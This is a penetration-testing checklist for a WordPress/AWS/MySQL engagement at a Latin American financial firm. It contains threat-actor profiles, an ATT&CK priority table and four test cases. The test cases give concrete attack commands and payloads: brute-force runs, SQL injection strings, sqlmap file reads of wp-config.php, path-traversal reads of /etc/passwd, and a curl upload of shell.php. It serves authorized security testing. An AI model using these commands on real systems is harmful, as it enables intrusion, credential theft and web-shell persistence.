# PENETRATION TESTING CHECKLIST
## 10-Day Web Application Engagement: WordPress | AWS | MySQL
### Client: Financial Services - Latin America
### Focus: Initial Access, Authentication Bypass, Data Exfiltration

---

## EXECUTIVE SUMMARY

This penetration testing engagement targets a WordPress-based web application hosted on AWS infrastructure with MySQL database backend, serving a financial services organization in Latin America. The threat landscape for this client is dominated by financially motivated threat actors with demonstrated capabilities against this exact technology stack.

**Primary Threat Context**: Three threat groups represent the most significant risk to this client profile:
- **FIN13 (Elephant Beetle)** - The most relevant threat, specifically targeting Latin American financial institutions with documented SQL injection attacks against MySQL databases and web application exploitation as primary initial access vectors
- **Malteiro (Mispadu operators)** - Latin America-focused banking trojan operation with extensive phishing and credential harvesting capabilities
- **FIN7** - Global financial cybercrime group with documented AWS cloud infrastructure targeting and web shell deployment expertise

These threat actors have demonstrated the ability to chain web application vulnerabilities, weak authentication controls, and cloud misconfigurations to achieve unauthorized access, establish persistence via web shells, and exfiltrate sensitive financial data. This engagement will emulate their attack patterns to identify exploitable weaknesses before adversaries do.

---

## THREAT ACTOR PROFILES

### FIN13 (Elephant Beetle) | G1016
**Operational Focus**: Direct financial theft from Latin American banking institutions  
**Active Since**: 2020-Present (documented 2+ year campaigns)  
**Geographic Focus**: Mexico, Chile, Brazil, Argentina, and broader Latin America  
**Relevant Capabilities**:
- SQL injection against MySQL databases (primary technique)
- Exploitation of web application vulnerabilities (Java apps, WebLogic, Primefaces)
- Web shell deployment for persistent access
- PowerShell and Empire framework for post-exploitation
- Long-term persistent access for ongoing theft operations

**Why They Matter**: FIN13 represents the most direct threat to this client, with documented targeting of financial institutions in the exact region and industry vertical, using techniques directly applicable to WordPress/MySQL environments.

---

### Malteiro (Mispadu Operators) | G1026
**Operational Focus**: Banking credential theft and financial fraud  
**Active Since**: 2019-Present (most prevalent Latin American banking trojan in 2024)  
**Geographic Focus**: Brazil, Mexico, Chile, Peru, Bolivia, Portugal (Spanish/Portuguese speakers)  
**Relevant Capabilities**:
- Phishing campaigns targeting financial sector employees
- Web-based credential harvesting
- Browser credential theft (saved passwords)
- System language detection (targets Spanish/Portuguese systems)
- CVE-2023-36025 exploitation (SmartScreen bypass)

**Why They Matter**: Malteiro's phishing operations could compromise WordPress administrators or database administrators, yielding credentials for direct access. Their focus on Latin American financial targets makes them a persistent regional threat.

---

### FIN7 (Carbanak, Carbon Spider) | G0046
**Operational Focus**: Financial theft, ransomware operations, initial access brokerage  
**Active Since**: 2013-Present (11+ years of operations)  
**Geographic Focus**: Global (including financial services worldwide)  
**Relevant Capabilities**:
- Public-facing web application exploitation (T1190)
- Web shell deployment and persistence (T1505.003)
- AWS cloud infrastructure compromise
- SQL injection and database targeting (MySQL documented)
- Ransomware deployment and data theft extortion
- Initial access brokerage (selling compromised access)

**Why They Matter**: FIN7's technical sophistication, AWS targeting experience, and documented web shell deployment make them a credible threat to cloud-hosted WordPress applications. Their evolution into ransomware and initial access brokerage increases risk beyond direct financial theft.

---

## PRIORITIZED TTP TABLE

| Priority | ATT&CK ID | Technique | Tactic | Impact | Effort | Quick Win Score |
|----------|-----------|-----------|--------|--------|--------|-----------------|
| **HIGH** | T1190 | Exploit Public-Facing Application | Initial Access | CRITICAL | MEDIUM | ⭐⭐⭐⭐ |
| **HIGH** | T1078.001 | Valid Accounts: Default Accounts | Initial Access | CRITICAL | LOW | ⭐⭐⭐⭐⭐ |
| **HIGH** | T1078 | Valid Accounts | Initial Access / Persistence | CRITICAL | LOW-MEDIUM | ⭐⭐⭐⭐⭐ |
| **HIGH** | T1505.003 | Web Shell | Persistence | HIGH | MEDIUM | ⭐⭐⭐⭐ |
| **HIGH** | T1530 | Data from Cloud Storage | Collection | CRITICAL | LOW | ⭐⭐⭐⭐⭐ |
| **HIGH** | T1041 | Exfiltration Over C2 Channel | Exfiltration | HIGH | LOW | ⭐⭐⭐⭐ |
| **HIGH** | T1071.001 | Application Layer Protocol: Web | Command & Control | MEDIUM | LOW | ⭐⭐⭐ |
| **MEDIUM** | T1087 | Account Discovery | Discovery | MEDIUM | LOW | ⭐⭐⭐ |
| **MEDIUM** | T1082 | System Information Discovery | Discovery | LOW | LOW | ⭐⭐ |
| **MEDIUM** | T1566.001 | Phishing: Spearphishing Attachment | Initial Access | HIGH | MEDIUM | ⭐⭐⭐ |
| **MEDIUM** | T1555.003 | Credentials from Web Browsers | Credential Access | MEDIUM | MEDIUM | ⭐⭐ |
| **MEDIUM** | T1059.001 | PowerShell | Execution | MEDIUM | MEDIUM | ⭐⭐ |

**Quick Win Score**: ⭐⭐⭐⭐⭐ = Highest priority (Critical impact, Low effort) | ⭐ = Lower priority

---

## ACTIONABLE TEST CASES

### PHASE 1: INITIAL ACCESS (Days 1-3)

---

#### Test Case 1: WordPress Authentication Bypass & Brute Force

- [ ] **EXECUTE THIS TEST**

**ATT&CK Technique**: T1078.001 - Valid Accounts: Default Accounts  
**Priority**: HIGH | **Effort**: LOW | **Impact**: CRITICAL

**Preconditions**:
- WordPress admin login page accessible (typically `/wp-admin` or `/wp-login.php`)
- Internet connectivity to target application
- Wordlist for credential attacks

**Testing Approach**:
1. **Enumerate valid usernames** via WordPress REST API (`/wp-json/wp/v2/users`) or author archive pages (`/?author=1`)
2. **Test default credentials**: admin/admin, admin/password, admin/[sitename], admin/123456
3. **Perform targeted brute force** using WPScan or Burp Intruder against identified usernames with common financial sector passwords
4. **Test XML-RPC interface** for authentication bypass or brute force amplification (`/xmlrpc.php` - allows multiple auth attempts per request)
5. **Check for user enumeration via login errors** (different messages for valid vs invalid usernames)

**Tools & Payloads**:
```bash
# Username enumeration via REST API
curl https://target.com/wp-json/wp/v2/users

# WPScan brute force
wpscan --url https://target.com --enumerate u --passwords /usr/share/wordlists/rockyou.txt

# XML-RPC brute force (amplification attack)
wpscan --url https://target.com --password-attack xmlrpc -U admin -P passwords.txt

# Burp Intruder with financial sector password list
# Payload positions: username and password fields
```

**Success Criteria**:
- ✅ Valid WordPress admin credentials obtained
- ✅ Access to WordPress admin dashboard (`/wp-admin`)
- ✅ Ability to modify site content, install plugins, or access theme editor
- ✅ User enumeration successful (list of valid usernames obtained)

**Finding Indicators**:
- Successful admin panel login
- Session cookie obtained with administrative privileges
- User list retrieved via REST API or enumeration techniques

---

#### Test Case 2: SQL Injection - WordPress Plugins & Core

- [ ] **EXECUTE THIS TEST**

**ATT&CK Technique**: T1190 - Exploit Public-Facing Application  
**Priority**: HIGH | **Effort**: MEDIUM | **Impact**: CRITICAL

**Preconditions**:
- WordPress site with accessible plugins/themes
- Ability to identify installed plugins and versions
- Understanding of MySQL syntax

**Testing Approach**:
1. **Enumerate WordPress version, plugins, and themes** using WPScan, version disclosure in source code, readme files
2. **Identify vulnerable components** via CVE databases, WPVulnDB, and exploit-db for known SQL injection vulnerabilities
3. **Test common injection points**: search parameters, user-controlled GET/POST parameters in plugin functionality, REST API endpoints
4. **Use SQLMap for automated detection and exploitation** against identified injection points
5. **Manual verification**: Test for error-based, boolean-based, and time-based SQL injection

**Tools & Payloads**:
```bash
# Plugin/theme enumeration
wpscan --url https://target.com --enumerate ap,at --plugins-detection aggressive

# Automated SQL injection testing
sqlmap -u "https://target.com/wp-content/plugins/vulnerable-plugin/file.php?id=1" \
  --dbs --batch --random-agent

# Manual SQL injection test payloads
' OR '1'='1
' AND 1=1--
' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)--

# Extract wp-config.php credentials after confirmed SQLi
sqlmap -u "https://target.com/?vuln_param=1" --file-read=/var/www/html/wp-config.php
```

**Success Criteria**:
- ✅ SQL injection vulnerability confirmed (error messages, boolean logic changes, or time delays)
- ✅ Database name, version, and structure enumerated
- ✅ WordPress database credentials extracted from wp_options or via file read
- ✅ Sensitive data extracted (user hashes, wp_users table, wp_posts with financial data)

**Finding Indicators**:
- MySQL error messages in HTTP responses
- Successful UNION-based data extraction
- Time-based blind SQLi confirmation (5+ second delays)
- wp-config.php contents retrieved (database credentials, salts, AWS keys)

---

#### Test Case 3: WordPress Plugin/Theme Vulnerability Exploitation

- [ ] **EXECUTE THIS TEST**

**ATT&CK Technique**: T1190 - Exploit Public-Facing Application  
**Priority**: HIGH | **Effort**: MEDIUM | **Impact**: CRITICAL

**Preconditions**:
- WordPress plugins/themes identified
- Access to exploit databases and proof-of-concept code
- Ability to upload files or execute code via exploits

**Testing Approach**:
1. **Create comprehensive plugin/theme inventory** with exact version numbers
2. **Cross-reference against vulnerability databases**: WPVulnDB, CVE, exploit-db, Wordfence intelligence
3. **Prioritize RCE, arbitrary file upload, and LFI/RFI vulnerabilities** (direct path to initial access)
4. **Test identified vulnerabilities** using public exploits or custom payloads
5. **Verify exploitation** by achieving code execution, file upload, or sensitive file disclosure

**Tools & Payloads**:
```bash
# Automated vulnerability scanning
wpscan --url https://target.com --enumerate vp,vt --api-token YOUR_TOKEN

# Search for plugin-specific exploits
searchsploit wordpress plugin_name
searchsploit -m exploits/php/webapps/XXXXX.txt

# Common vulnerable plugin patterns to test:
# - File upload vulnerabilities (no extension validation)
# - Local File Inclusion: ?file=../../../../etc/passwd
# - Remote Code Execution via unsanitized parameters
# - Authentication bypass via parameter manipulation

# Example: Arbitrary file upload exploit
curl -X POST https://target.com/wp-content/plugins/vuln-plugin/upload.php \
  -F "file=@shell.php" -F "action=upload"
```

**Success Criteria**:
- ✅ Successful exploitation of plugin/theme vulnerability
- ✅ Remote code execution achieved (e.g., phpinfo() output or system command execution)
- ✅ Arbitrary file uploaded to web-accessible directory
- ✅ Local file inclusion used to read wp-config.php or other sensitive files

**Finding Indicators**:
- Web shell uploaded and accessible via browser
- Sensitive file contents disclosed (wp-config.php, /etc/passwd)
- Code execution confirmed via command output in HTTP response
- Unauthenticated access to administrative functions

---

#### Test Case 4: wp-config.php Exposure & Sensitive File Disclosure

- [ ] **EXECUTE THIS TEST**

**ATT&CK Technique**: T1078 - Valid Accounts (Credential Discovery)  
**Priority**: HIGH | **Effort**: LOW | **Impact**: CRITICAL

**Preconditions**:
- WordPress installation accessible
- Common misconfigurations or LFI/path traversal vulnerabilities
- Backup files or version control directories present

**Testing Approach**:
1. **Test direct access to configuration files**: `wp-config.php`, `wp-config.php.bak`, `wp-config.old`, `wp-config.php~`
2. **Check for exposed backup directories**: `/.git/`, `/.svn/`, `/backup/`, `/.wp-config.php.swp`
3. **Exploit Local File Inclusion** to read wp-config.php via path traversal: `?file=../../../../wp-config.php`
4. **Check for directory listing vulnerabilities** in `/wp-content/uploads/`, `/wp-content/backups/`
5. **Leverage SQL injection or RCE** (if previously achieved) to read file system

**Tools & Payloads**:
```bash
# Direct access attempts
curl https://target.com/wp-config.php
curl https://target.com/wp-config.php.bak
curl https://target.com/wp-config.old
curl https://target.com/.wp-config.php.swp

# Git repository exposure
curl https://target.com/.git/config
python3 git-dumper.py https://target.com/.git/ ./dump/

# LFI exploitation for wp-config.php
https://target.com/page?file=../wp-config.php
https://target.com/page?file=php://filter/convert.base64-encode/resource=wp-config.php

# Common backup file locations
https://target.com/wp-content/uploads/backup/wp-config.php
https://target.com/backups/database.sql
```

**Success Criteria**:
- ✅ wp-config.php file contents retrieved
- ✅ MySQL database credentials extracted (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST)
- ✅ WordPress security salts and keys obtained
- ✅ AWS access keys or other cloud credentials found in configuration
- ✅ Additional sensitive information disclosed (API keys, SMTP credentials)

**Finding Indicators**:
- Database connection string visible
- Clear-text MySQL passwords obtained
- AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY present in configuration
- Ability to connect directly to MySQL database using extracted credentials

